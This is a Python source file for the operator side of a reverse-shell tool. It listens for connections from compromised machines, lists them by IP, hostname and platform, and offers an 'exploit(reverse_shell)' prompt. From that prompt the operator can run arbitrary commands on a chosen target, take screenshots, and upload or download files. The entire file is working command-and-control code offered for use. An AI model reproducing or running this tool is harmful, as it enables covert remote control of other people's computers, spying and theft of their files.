#!/usr/bin/env python3

#
# Python Reverse Shell Server
#
# Nicholas Waltz
#

import sys, os
import stat
import socket, struct
import time
from queue import Queue
import readline
import threading
import signal
import subprocess
import tarfile

from helpers import *


NUM_THREADS = 2
JOBS = [1,2]
queue = Queue()

CHUNKSIZE=2048
OUTPUT_SIZE=8192

class Server(object):
	def __init__(self):
		self.host = ''
		self.port = 50004
		self.socket = None
		self.bound = False

		self.connections = []
		self.addresses = []

		
	
	def register_signal_handler(self):
		signal.signal(signal.SIGINT, self.quit_gracefully)
		signal.signal(signal.SIGTERM, self.quit_gracefully)
		signal.signal(signal.SIGPIPE, self.quit_gracefully)
		return

	def quit_gracefully(self, signal=None, frame=None):
		if signal == None:
			print("Bye!")
		else:
			print("\nBye!")

		

		for conn in self.connections:
			try:
				conn.shutdown(2)
				conn.close()
			except Exception as e:
				print('Could not close connection %s' % str(e))

		self.bound = False

		self.socket.close()
		queue.task_done()
		queue.task_done()
		
		sys.exit(0)
		return

	def socket_create(self):
		try:
			self.socket = socket.socket()
			self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		except socket.error as error:
			print("Socket creation failed: " + str(error))
			sys.exit(1)
		return

	def socket_bind(self):
		try:
			self.socket.bind((self.host, self.port))
			self.socket.listen(5)
		except socket.error as error:
			print("Binding Failed: " + str(error))
			time.sleep(2)
			self.socket_bind()

		self.bound = True
		return

	def accept(self):
		for c in self.connections:
			c.close()
		self.connections = []
		self.addresses = []
		while 1:
			try:
				client, address = self.socket.accept()
				client.setblocking(1)
				client_details = client.recv(8192).decode('utf-8').split('___')
				address = address + (client_details[0], client_details[1])
			except:
				continue
			self.connections.append(client)
			self.addresses.append(address)

		return
	#----

	


	def prompt(self):

		print("A python reverse shell",  end='\n\n')
		print("Type help for a list of commands", end='\n\n')

		while 1:
			if self.bound:
				
				cmd = input('exploit(\033[1;31mreverse_shell\033[0m) > ')

				if cmd == 'help':
					print("help\t\tDisplays this help.")
					print("list/ls\t\tLists all current connections.")
					print("refresh\t\t(same as list)")
					print("use <id>\tStarts shell of client <id>")
					print("quit/q\t\tQuit prompt")
					continue
				elif cmd == 'list' or cmd == 'refresh' or cmd == 'ls':
					self.list_connections()
					continue
				elif cmd == 'quit' or cmd == "q":
					self.quit_gracefully()
					break
				elif cmd == '':
					continue
				elif 'use' in cmd:
					self.use_connection(cmd)
				else:
					print('No such command. Type help for list of available commands.')

		return

	def use_connection(self, cmd):
		target = cmd.split(' ')[-1]
		try:
			target = int(target)
		except:
			print("Index should be an integer")
			return
		try:
			client = self.connections[target]
		except IndexError:
			print("No client with id " + str(target) + ". Type list for all clients")
			return
		
		self.start_shell(target, client)
		return

	def start_shell(self, target, client):
		print('You are now connected to ' + str(self.addresses[target][0]) + ' (' + str(self.addresses[target][3]) + ')')

		
		while 1:
			
			cmd = input('\033[36mshell\033[0m > ')
			if cmd == 'background' or cmd == 'bg':
				print('Shell '+ str(target) +' has been moved to the background.')
				break
                
			if len(str.encode(cmd)) > 0:
				self.send_command(cmd, client, target)
			
			if cmd == 'quit' or cmd == 'q':
				del self.addresses[target]
				del self.connections[target]
				print('Shell '+ str(target) +' ended.')
				break
                
				


		return

	def send_command(self, cmd, client, target):
		if client is not None:
			local = False

			if cmd == 'local':
				local = True
				os.system("/bin/bash --rcfile ~/.bash_profile")
			
			elif cmd == 'help' or cmd == 'h':
				local = True
				print(
				"\nAvailable special commands:\n\n"+
				"----- On target machine -----\n\n"+
				"screenshot\tTake a screenshot\n"+
				"cwd\t\tOutputs current working directory\n"+
				"\n----- On local machine -----\n\n"+
				"local\t\tOpens a local shell\n"+
				"\n----- Other commands -----\n\n"+
				"help/h\t\tDisplays this help\n"+
				"upload <from> [<to>]\n"+
				"download <from> [<to>]\n"+
				"background/bg\tMove this session to the background\n"+
				"quit/q\t\tTerminate client process\n\n\0"
				)
			
			if not local:
				client.send(str.encode(cmd))
			

			if cmd == 'screenshot':
				local = True
				filename = '/tmp/' + str(hex(int(time.time() * 10000000))[5:]) + ('.png' if self.addresses[target][3] != 'win32' else '.bmp')
				try:
					self.download(client, filename)
				except:
					print('\rAn error occured.')
				else:
					print('\nFile saved to '+ filename)
			
			elif cmd == 'quit' or cmd == "q":
				local = True
			elif 'download' in cmd:
				local = True
				filename = '/tmp/' + str(hex(int(time.time() * 10000000))[5:])
				try:
					self.download(client, filename)
				except:
					print('\rAn error occured.')
				else:
					print('\nFile saved to '+ filename)

			elif 'upload' in cmd:
				fmt = cmd.split(' ')
				if len(fmt) == 3:
					filename = fmt[-1]
					
					try:
						self.upload(client, filename)
					except:
						print('\rAn error occured.')
					else:
						print("")
				
			
			
			if not local: 
				self.receive_output(client)

			
		return

	
	def download(self, client, dest, src = None):

		isdir = client.recv(1) == b'\x10'
		


		flen = client.recv(8)
		flen = struct.unpack(">2I", flen)[0]
		left = flen		
		
		b = CHUNKSIZE
		
		f = open(dest + (".tar" if isdir else ""), 'wb')

		progressbar(0, "Downloading")

		while 1:
			if left < CHUNKSIZE: b = left
			content = client.recv(b)
			
			f.write(content)

			left -= CHUNKSIZE
			
			try:
				client.send(b'\x01')
			except:
				break
			
			progressbar((flen - left)/flen, "Downloading")

			if left <= 0: break
			


		f.close()

		if isdir:
			try:
				with tarfile.open(dest + ".tar") as tar:
					tar.extractall(".")
			except Exception as e:
				print(str(e))
				
			os.remove(dest + ".tar")
		return

	def upload(self, client, src, dest = None):
		fstat = os.stat(src)
		isdir = stat.S_ISDIR(fstat.st_mode)
		flen = 0
	
		if isdir:
			client.send(b'\x10')
			with tarfile.open(src + ".tar", "w") as tar:
				tar.add(src, arcname=os.path.basename(src))
			flen = os.stat(src + ".tar").st_size
		else:
			client.send(b'\x11')
			flen = fstat.st_size
		
		

		

		f = open(src + (".tar" if isdir else ""), 'rb')
		
		left = flen
		
		b = CHUNKSIZE

		size_bytes = struct.pack("<Q", flen)
		client.send(size_bytes)
		
		progressbar(0, "Uploading %s" % (src))

		while 1:
			if left < CHUNKSIZE: b = left
			
			content = f.read(b)

			client.send(content)
			left -= CHUNKSIZE

			try:
				# server side sync
				client.recv(1)
			except:
				break
				
			progressbar((flen - left)/flen, "Uploading %s" % (src))

			if left <= 0: break

		f.close()

		if isdir:
			os.remove(src + ".tar")
		
		return

	def receive_output(self, client):
		out = client.recv(OUTPUT_SIZE)
		print(str(out.decode('utf-8')), end='')
		return

	def refresh(self):
		for i, client in enumerate(self.connections):
			try:
				client.send(str.encode(' '))
				client.recv(OUTPUT_SIZE)
			except:
				del self.addresses[i]
				del self.connections[i]

	def list_connections(self):
		self.refresh()
		result = ''
		for i, address in enumerate(self.addresses):
				result += str(i) + '\t' + str(address[0]) + '\t' + str(address[2]) + ' (' + str(address[3]) + ')\n'

		print(('-------- Clients --------\n' + 'id\tIP\t\thostname (platform)\n' if result != '' else 'No active clients.') + result)
		return





def threads():
	server = Server()
	server.register_signal_handler()
	
	for _ in range(NUM_THREADS):
		
		t = threading.Thread(target=work, args=(server,))
		t.daemon = True
		t.start()

	return


def work(server):
	while 1:
		x = queue.get()
		if x == 1:
			server.socket_create()
			server.socket_bind()
			server.accept()
		if x == 2:
			server.prompt()
		queue.task_done()
	return


def jobs():
	for i in JOBS:
		queue.put(i)
	queue.join()
	return

def main():
	
	threads()
	jobs()


if __name__ == '__main__':
	main()





